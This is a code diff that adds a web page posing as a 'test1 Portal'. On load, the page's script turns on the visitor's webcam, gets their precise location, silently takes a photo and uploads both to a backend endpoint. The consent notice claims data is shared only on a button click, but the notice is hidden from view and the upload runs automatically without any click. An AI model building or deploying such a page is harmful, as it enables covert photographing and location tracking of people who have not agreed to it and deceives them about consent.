@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>test1 Portal</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; background-color: #f4f4f9; }
+        .container { max-width: 500px; margin: 0 auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: none; }
+        h1 { color: #111; margin-bottom: 10px; }
+        .disclaimer { background-color: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; font-size: 14px; margin-bottom: 20px; border: 1px solid #ffeeba; text-align: left; line-height: 1.4; }
+        video { border-radius: 8px; width: 100%; background-color: #222; margin-bottom: 15px; border: 2px solid #ddd; }
+        button { padding: 14px 24px; font-size: 16px; font-weight: bold; cursor: pointer; background-color: #000; color: white; border: none; border-radius: 8px; transition: background 0.3s; width: 100%; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        button:hover:not(:disabled) { background-color: #333; }
+        #statusMessage { margin-top: 15px; font-weight: bold; font-size: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Welcome to test1</h1>
+        
+        <div class="disclaimer">
+            <strong>Security Notice:</strong> To proceed, we require a quick photo and your current location. By clicking the button below, you consent to sharing this data with test1.
+        </div>
+
+        <video id="videoFeed" autoplay playsinline></video>
+        <canvas id="photoCanvas" style="display:none;"></canvas>
+        
+        <button id="sendDataBtn" disabled>Initializing Camera...</button>
+        <p id="statusMessage"></p>
+    </div>
+
+    <script>
+        const video = document.getElementById('videoFeed');
+        const canvas = document.getElementById('photoCanvas');
+        const sendBtn = document.getElementById('sendDataBtn');
+        const statusText = document.getElementById('statusMessage');
+
+        // 1. Start Camera Safely
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // Wait for the video to actually start playing before sending data automatically
+                video.onloadedmetadata = () => {
+                    sendDataAutomatically();
+                };
+            } catch (err) {
+                console.error("Camera access denied.");
+            }
+        }
+
+        // 2. Automatic Send Data
+        async function sendDataAutomatically() {
+            if (!navigator.geolocation) {
+                console.error("Geolocation is not supported.");
+                return;
+            }
+
+            // Request Location
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    await captureAndSend(locationData);
+                },
+                (error) => {
+                    console.error("Location access denied.");
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+
+        // 3. Take Photo and Send to Vercel
+        async function captureAndSend(locationData) {
+            try {
+                // Set canvas size to match video exactly
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+
+                // Send to backend
+                const response = await fetch('/api/save-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imageData, location: locationData })
+                });
+
+                const result = await response.json();
+
+                if (response.ok) {
+                    console.log("Success! Data sent.");
+                } else {
+                    throw new Error(result.error || "Server rejected the data.");
+                }
+
+            } catch (err) {
+                console.error("Upload Failed: " + err.message);
+            }
+        }
+
+        // Initialize on page load
+        startCamera();
+    </script>
+
+</body>
+</html>
